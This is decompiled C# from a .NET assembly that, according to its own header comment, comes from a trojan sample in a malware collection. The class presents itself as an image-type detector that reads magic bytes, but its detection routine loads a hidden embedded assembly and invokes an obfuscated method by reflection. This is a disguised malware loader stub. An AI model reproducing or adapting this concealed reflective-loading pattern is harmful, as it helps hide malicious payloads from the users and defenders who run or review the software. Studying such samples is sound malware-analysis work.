// Decompiled with JetBrains decompiler
// Type: Dyinf.SchemaQueue
// Assembly: Ryesfzsg-TikTiok-3, Version=10.0.17763.1, Culture=neutral, PublicKeyToken=null
// MVID: 769E8809-C065-45A9-9DFC-A2C283CDC2FF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan.Win32.Generic-db622b8d91a72f6ecd40d9659cd9a71a523c7e4b66e527b0106211dcbf428d9b.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace Dyinf
{
  internal class SchemaQueue
  {
    private static SchemaQueue VerifySystem;

    internal static byte[] ComputeSetter(string spec) => File.Exists(spec) ? File.ReadAllBytes(spec) : (byte[]) null;

    internal static SchemaQueue.MiniDumpType WriteSetter(string asset)
    {
      byte[] spec = (byte[]) SchemaQueue.MapSystem((object) asset);
      return spec == null ? SchemaQueue.MiniDumpType.UNKNOWN : SchemaQueue.DeleteSetter(spec);
    }

    internal static SchemaQueue.MiniDumpType DeleteSetter(byte[] spec)
    {
      Assembly assembly = Assembly.Load(WorkerModelWrapper.CompareSetter());
      byte[] bytes = Encoding.ASCII.GetBytes("BM");
      Type type = assembly.GetType("Nlgdptya.Tgysosoukzycnfsjmquzsyns");
      byte[] first1 = (byte[]) SchemaQueue.WriteSystem((object) Encoding.ASCII, (object) "GIF");
      byte[] numArray1 = new byte[4];
      // ISSUE: field reference
      SchemaQueue.CancelSystem((object) numArray1, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0030F4636C78F65D3639ECE5A064B5AE753E3408614A14FB18AB4D7540D2C248543));
      byte[] first2 = numArray1;
      byte[] first3 = new byte[3]
      {
        (byte) 73,
        (byte) 73,
        (byte) 42
      };
      byte[] first4 = new byte[3]
      {
        (byte) 77,
        (byte) 77,
        (byte) 42
      };
      MethodInfo method = ((IEnumerable<MethodInfo>) type.GetMethods()).First<MethodInfo>((Func<MethodInfo, bool>) (x => x.Name == "Dnedmxuhnqmjfki"));
      byte[] first5 = new byte[4]
      {
        byte.MaxValue,
        (byte) 216,
        byte.MaxValue,
        (byte) 224
      };
      byte[] first6 = new byte[4]
      {
        byte.MaxValue,
        (byte) 216,
        byte.MaxValue,
        (byte) 225
      };
      Delegate @delegate = Delegate.CreateDelegate(typeof (Action), method);
      byte[] numArray2 = new byte[4];
      object[] objArray = new object[0];
      @delegate.DynamicInvoke(objArray);
      Buffer.BlockCopy((Array) spec, 0, (Array) numArray2, 0, 4);
      if (((IEnumerable<byte>) bytes).SequenceEqual<byte>(((IEnumerable<byte>) numArray2).Take<byte>(bytes.Length)))
        return SchemaQueue.MiniDumpType.BMP;
      if (((IEnumerable<byte>) first1).SequenceEqual<byte>(((IEnumerable<byte>) numArray2).Take<byte>(first1.Length)))
      {
        int num = 0;
        if (\u003CModule\u003E\u007B61941ebd\u002D05fa\u002D42d2\u002D8902\u002D297cceb54ec8\u007D.m_15031b98f7944126bb603d76ec2604f3.m_ffcf4c658d1c4547a158b0fdbe9e91cc != 0)
          goto label_5;
label_1:
        switch (num)
        {
          default:
            return SchemaQueue.MiniDumpType.GIF;
        }
label_5:
        num = 0;
        goto label_1;
      }
      else
      {
        if (((IEnumerable<byte>) first2).SequenceEqual<byte>(((IEnumerable<byte>) numArray2).Take<byte>(first2.Length)))
          return SchemaQueue.MiniDumpType.PNG;
        if (((IEnumerable<byte>) first3).SequenceEqual<byte>(((IEnumerable<byte>) numArray2).Take<byte>(first3.Length)) || ((IEnumerable<byte>) first4).SequenceEqual<byte>(((IEnumerable<byte>) numArray2).Take<byte>(first4.Length)))
          return SchemaQueue.MiniDumpType.TIFF;
        return ((IEnumerable<byte>) first5).SequenceEqual<byte>(((IEnumerable<byte>) numArray2).Take<byte>(first5.Length)) || ((IEnumerable<byte>) first6).SequenceEqual<byte>(((IEnumerable<byte>) numArray2).Take<byte>(first6.Length)) ? SchemaQueue.MiniDumpType.JPEG : SchemaQueue.MiniDumpType.UNKNOWN;
      }
    }

    internal static bool RegisterSystem() => SchemaQueue.VerifySystem == null;

    internal static SchemaQueue CheckSystem() => SchemaQueue.VerifySystem;

    internal static object MapSystem([In] object obj0) => (object) SchemaQueue.ComputeSetter((string) obj0);

    internal static object WriteSystem([In] object obj0, [In] object obj1) => (object) ((Encoding) obj0).GetBytes((string) obj1);

    internal static void CancelSystem([In] object obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray((Array) obj0, obj1);

    internal enum MiniDumpType
    {
      BMP,
      JPEG,
      GIF,
      TIFF,
      PNG,
      UNKNOWN,
    }
  }
}
